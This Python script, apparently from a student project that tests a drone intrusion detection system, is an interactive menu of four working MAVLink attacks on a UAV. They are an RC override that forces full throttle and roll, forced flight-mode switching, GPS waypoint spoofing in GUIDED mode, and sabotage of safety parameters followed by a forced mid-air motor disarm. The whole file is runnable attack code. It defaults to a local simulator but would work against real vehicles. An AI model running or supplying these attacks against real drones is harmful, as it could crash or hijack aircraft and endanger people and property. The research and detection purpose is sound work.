"""
=============================================================
  UAV Cyber-Attack Simulation Suite
  Part of the UAV Cyber Defense System (MSc FYP)
  
  This script contains 4 distinct MAVLink injection attacks
  designed to test the LSTM Intrusion Detection System.
=============================================================
"""
import time
import argparse
from pymavlink import mavutil

# ───────────────────────────────────────────────────────────
#  Utility
# ───────────────────────────────────────────────────────────
def connect_vehicle(connection_string):
    print(f"[*] Connecting to vehicle on: {connection_string}")
    vehicle = mavutil.mavlink_connection(connection_string)
    vehicle.wait_heartbeat()
    print(f"[*] Connected! Target system: {vehicle.target_system}, component: {vehicle.target_component}")
    return vehicle

# ───────────────────────────────────────────────────────────
#  ATTACK 1 : RC Channel Hijack  (Physical Crash Override)
# ───────────────────────────────────────────────────────────
def attack_rc_override(vehicle, duration=15):
    """
    Hijacks the drone's physical RC inputs.
    Forces maximum roll + maximum throttle to spin the drone
    violently out of control, causing extreme attitude angles
    that the LSTM / fallback detector will catch.
    """
    print("\n" + "="*55)
    print("  ATTACK 1: RC CHANNEL HIJACK (CRASH OVERRIDE)")
    print("="*55)
    
    # Step 1: Force into STABILIZE so RC inputs take effect
    print("[1/3] Forcing flight mode to STABILIZE...")
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        0, 0, 0, 0, 0, 0  # Mode 0 = STABILIZE
    )
    time.sleep(1.0)
    
    # Step 2: Force ARM motors (in case they were disarmed)
    print("[2/3] Force-arming motors...")
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
        1, 0, 0, 0, 0, 0, 0
    )
    time.sleep(1.0)
    
    # Step 3: Blast malicious RC overrides at 10Hz
    print(f"[3/3] Injecting malicious RC overrides for {duration}s...")
    print("       Ch1(Roll)=MAX  Ch3(Throttle)=MAX")
    start = time.time()
    count = 0
    while (time.time() - start) < duration:
        vehicle.mav.rc_channels_override_send(
            vehicle.target_system, vehicle.target_component,
            2000,  # Ch1: Roll  → hard right
            1000,  # Ch2: Pitch → nose dive
            2000,  # Ch3: Throttle → full power
            2000,  # Ch4: Yaw   → spin
            0, 0, 0, 0
        )
        count += 1
        time.sleep(0.1)
    
    # Release
    vehicle.mav.rc_channels_override_send(
        vehicle.target_system, vehicle.target_component,
        0, 0, 0, 0, 0, 0, 0, 0
    )
    print(f"\n[✓] Attack complete. {count} malicious packets injected.")

# ───────────────────────────────────────────────────────────
#  ATTACK 2 : Malicious Mode Forcing  (Mission Abort)
# ───────────────────────────────────────────────────────────
def attack_mode_change(vehicle):
    """
    Forces the drone to instantly abandon its current mission
    by injecting repeated MAV_CMD_DO_SET_MODE commands.
    Rapidly alternates between LAND and RTL to create chaos.
    """
    print("\n" + "="*55)
    print("  ATTACK 2: MALICIOUS MODE FORCING (MISSION ABORT)")
    print("="*55)
    
    modes = [
        ('LAND', 9),
        ('RTL',  6),
        ('LAND', 9),
        ('STABILIZE', 0),
        ('RTL',  6),
    ]
    
    for mode_name, mode_id in modes:
        print(f"[INJECT] Forcing mode → {mode_name} (id={mode_id})")
        vehicle.mav.command_long_send(
            vehicle.target_system, vehicle.target_component,
            mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            mode_id, 0, 0, 0, 0, 0
        )
        time.sleep(1.5)
    
    print(f"\n[✓] Attack complete. {len(modes)} unauthorized mode changes injected.")

# ───────────────────────────────────────────────────────────
#  ATTACK 3 : GPS Waypoint Spoofing  (Silent Rerouting)
# ───────────────────────────────────────────────────────────
def attack_gps_spoof(vehicle, duration=15):
    """
    Injects fake GPS waypoint coordinates to silently reroute
    the drone to an attacker-chosen location. Also forces GUIDED
    mode so the drone obeys the spoofed coordinates.
    """
    print("\n" + "="*55)
    print("  ATTACK 3: GPS WAYPOINT SPOOFING (SILENT REROUTE)")
    print("="*55)
    
    # Attacker's target: a fake coordinate far away from the real mission
    SPOOF_LAT = -35.37000   # Fake latitude
    SPOOF_LON = 149.18000   # Fake longitude
    SPOOF_ALT = 50.0        # Dangerously high altitude
    
    # Step 1: Force GUIDED mode so the drone accepts position targets
    print(f"[1/2] Forcing GUIDED mode...")
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        4, 0, 0, 0, 0, 0  # Mode 4 = GUIDED
    )
    time.sleep(1.0)
    
    # Step 2: Repeatedly inject spoofed waypoint coordinates
    print(f"[2/2] Injecting spoofed coordinates for {duration}s...")
    print(f"       Target: ({SPOOF_LAT}, {SPOOF_LON}) at {SPOOF_ALT}m")
    start = time.time()
    count = 0
    while (time.time() - start) < duration:
        vehicle.mav.set_position_target_global_int_send(
            0,
            vehicle.target_system, vehicle.target_component,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            int(SPOOF_LAT * 1e7),
            int(SPOOF_LON * 1e7),
            SPOOF_ALT,
            0, 0, 0, 0, 0, 0, 0, 0
        )
        count += 1
        time.sleep(0.5)
    
    print(f"\n[✓] Attack complete. {count} spoofed waypoints injected.")

# ───────────────────────────────────────────────────────────
#  ATTACK 4 : Mid-Air Disarm & Parameter Manipulation
# ───────────────────────────────────────────────────────────
def attack_disarm(vehicle):
    """
    The most dangerous attack: Sabotages critical flight
    parameters, then sends a forced emergency disarm command
    to kill all motors mid-flight, causing the drone to fall.
    """
    print("\n" + "="*55)
    print("  ATTACK 4: MID-AIR DISARM & PARAMETER SABOTAGE")
    print("="*55)
    
    # Step 1: Corrupt safety parameters
    print("[1/3] Corrupting RTL_ALT → 1 cm (crash on return)...")
    vehicle.mav.param_set_send(
        vehicle.target_system, vehicle.target_component,
        b'RTL_ALT', 1,
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    )
    time.sleep(0.5)
    
    print("[2/3] Corrupting PILOT_SPEED_UP → 0 (no climb ability)...")
    vehicle.mav.param_set_send(
        vehicle.target_system, vehicle.target_component,
        b'PILOT_SPEED_UP', 0,
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    )
    time.sleep(0.5)
    
    # Step 2: Force emergency disarm mid-flight
    print("[3/3] Sending EMERGENCY DISARM (motors kill)...")
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
        0,      # 0 = disarm
        21196,  # Magic number for forced emergency disarm
        0, 0, 0, 0, 0
    )
    
    print(f"\n[✓] Attack complete. Parameters corrupted + motors killed.")

# ───────────────────────────────────────────────────────────
#  MAIN  –  Interactive Attack Menu
# ───────────────────────────────────────────────────────────
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='UAV Cyberattack Simulation Suite (MSc FYP)',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('--connect', default='udp:127.0.0.1:14551',
                        help='Vehicle connection string (default: udp:127.0.0.1:14551)')
    parser.add_argument('--attack',
                        choices=['rc_override', 'mode_change', 'gps_spoof', 'disarm'],
                        help='Attack type:\n'
                             '  rc_override  — RC Channel Hijack (Crash Override)\n'
                             '  mode_change  — Malicious Mode Forcing (Mission Abort)\n'
                             '  gps_spoof    — GPS Waypoint Spoofing (Silent Reroute)\n'
                             '  disarm       — Mid-Air Disarm & Parameter Sabotage')
    args = parser.parse_args()
    
    vehicle = connect_vehicle(args.connect)
    
    # If no attack was specified, show interactive menu
    if args.attack is None:
        print("\n" + "="*55)
        print("  UAV CYBERATTACK SIMULATION SUITE")
        print("="*55)
        print("  [1] RC Channel Hijack      (Crash Override)")
        print("  [2] Malicious Mode Forcing  (Mission Abort)")
        print("  [3] GPS Waypoint Spoofing   (Silent Reroute)")
        print("  [4] Mid-Air Disarm          (Parameter Sabotage)")
        print("  [0] Exit")
        print("="*55)
        
        choice = input("\nSelect attack [1-4]: ").strip()
        
        if choice == '1':
            attack_rc_override(vehicle)
        elif choice == '2':
            attack_mode_change(vehicle)
        elif choice == '3':
            attack_gps_spoof(vehicle)
        elif choice == '4':
            attack_disarm(vehicle)
        else:
            print("Exiting.")
    else:
        if args.attack == 'rc_override':
            attack_rc_override(vehicle)
        elif args.attack == 'mode_change':
            attack_mode_change(vehicle)
        elif args.attack == 'gps_spoof':
            attack_gps_spoof(vehicle)
        elif args.attack == 'disarm':
            attack_disarm(vehicle)
